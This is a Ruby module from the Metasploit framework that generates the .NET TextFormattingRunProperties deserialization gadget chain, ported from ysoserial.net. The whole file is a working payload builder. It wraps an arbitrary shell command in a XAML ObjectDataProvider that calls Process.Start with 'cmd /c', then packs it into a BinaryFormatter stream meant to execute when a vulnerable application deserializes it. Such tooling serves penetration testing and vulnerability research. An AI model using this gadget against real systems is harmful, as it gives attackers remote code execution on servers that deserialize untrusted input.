module Msf
module Util
module DotNetDeserialization
module GadgetChains

  class TextFormattingRunProperties < Types::SerializedStream

    # TextFormattingRunProperties
    #   Credits:
    #     Finders: Oleksandr Mirosh, Alvaro Munoz
    #     Contributors: Alvaro Munoz, Soroush Dalili

    def self.generate(cmd)
      # see: https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs
      resource_dictionary = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
        <ResourceDictionary
          xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
          xmlns:X="http://schemas.microsoft.com/winfx/2006/xaml"
          xmlns:S="clr-namespace:System;assembly=mscorlib"
          xmlns:D="clr-namespace:System.Diagnostics;assembly=system"
        >
          <ObjectDataProvider X:Key="" ObjectType="{X:Type D:Process}" MethodName="Start">
            <ObjectDataProvider.MethodParameters>
              <S:String>cmd</S:String>
              <S:String>/c #{cmd.encode(xml: :text)}</S:String>
            </ObjectDataProvider.MethodParameters>
          </ObjectDataProvider>
        </ResourceDictionary>
      EOS

      library = Types::RecordValues::BinaryLibrary.new(
        library_id: 2,
        library_name: "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
      )

      self.from_values([
        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        library,
        Types::RecordValues::ClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 1,
            name: 'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties',
            member_names: %w{ ForegroundBrush }
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: %i{ String }
          ),
          library_id: library.library_id,
          member_values: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 3, string: resource_dictionary))
          ]
        ),
        Types::RecordValues::MessageEnd.new
      ])
    end

  end

end
end
end
end
